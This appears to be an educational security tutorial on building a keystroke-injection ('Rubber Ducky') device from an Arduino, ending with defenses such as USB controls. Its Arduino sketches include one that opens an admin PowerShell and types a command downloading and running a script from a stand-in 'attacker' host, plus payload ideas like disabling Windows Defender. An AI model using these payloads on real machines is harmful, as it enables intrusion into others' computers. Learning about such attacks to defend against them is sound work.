---
title: "Building a Rubber Ducky with Arduino"
topic: "rubber-ducky-arduino"
tags: [hardware, arduino, hid, rubber-ducky, badusb, physical-security, keystroke-injection]
difficulty: intermediate
day: 50
layout: default
parent: Topics
nav_order: 50
---

# Building a Rubber Ducky with Arduino

## What You Will Learn
- What a USB Rubber Ducky is and how it works
- How HID (Human Interface Device) attacks work
- How to build a low-cost Rubber Ducky using Arduino
- Defensive measures against HID attacks

## What Is It?

A **USB Rubber Ducky** is a USB device that looks like a flash drive but acts as a keyboard. When plugged into a computer, it automatically types pre-programmed keystrokes. The target computer trusts it because keyboards are not scanned by antivirus.

This is called a **keystroke injection attack** or **BadUSB** attack.

The Arduino **Micro** and **Pro Micro** boards are popular for building low-cost Rubber Ducky alternatives — they use the ATmega32U4 chip which supports native USB HID.

## Why It Matters

- Physical access is the ultimate access — this attack requires only a few seconds
- Standard antivirus does not detect keystroke injection
- Used in red team physical assessments and CTFs
- Understanding it helps you build USB port controls as a defender

## Key Concepts

### How HID Attacks Work

1. Attacker prepares a script (payload) in Ducky Script or Arduino code
2. Device is disguised as a USB drive
3. Target plugs it in — the OS recognizes it as a keyboard
4. Device types the payload at hundreds of characters per second
5. Payload executes before the victim realizes what happened

### Arduino Setup

You need:
- Arduino Micro or Pro Micro (ATmega32U4)
- Arduino IDE with the `Keyboard` library

```bash
# Install Arduino IDE
# Install board: Arduino AVR Boards
# Include library: Keyboard.h
```

### Basic Arduino Keyboard Script

```cpp
#include <Keyboard.h>

void setup() {
    delay(2000);  // Wait for system to recognize device
    
    // Open Run dialog on Windows
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);
    
    // Type command
    Keyboard.println("cmd /k whoami");
    delay(500);
    
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
}

void loop() {}
```

### Reverse Shell Payload Example

```cpp
#include <Keyboard.h>

void setup() {
    delay(3000);
    
    // Open PowerShell as admin (Windows)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('x');
    Keyboard.releaseAll();
    delay(500);
    
    Keyboard.println("a");  // "Windows PowerShell (Admin)"
    delay(1000);
    
    // Type PowerShell reverse shell one-liner
    Keyboard.println("IEX (New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
}

void loop() {}
```

### Ducky Script (for Hak5 Rubber Ducky)

```
DELAY 2000
GUI r
DELAY 500
STRING cmd /k whoami
ENTER
```

### Common Payloads

- **Whoami** — check current user
- **Add admin user** — persist access
- **Disable Windows Defender** — remove AV protection
- **Download and execute** — download a payload from C2

## Defenses

- **Lock your screen** when leaving your computer
- Disable AutoRun/AutoPlay
- Use **USB port blockers** in physical security
- Deploy **endpoint USB control** software (block unknown USB keyboards)
- Enable Windows USB device filtering via Group Policy

## Resources

- [Hak5 Rubber Ducky](https://hak5.org/products/usb-rubber-ducky)
- [Arduino Keyboard Library](https://www.arduino.cc/reference/en/language/functions/usb/keyboard/)
- [PayloadAllTheThings — HID Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/HID%20Attacks)
- [TryHackMe — Physical Security](https://tryhackme.com/)
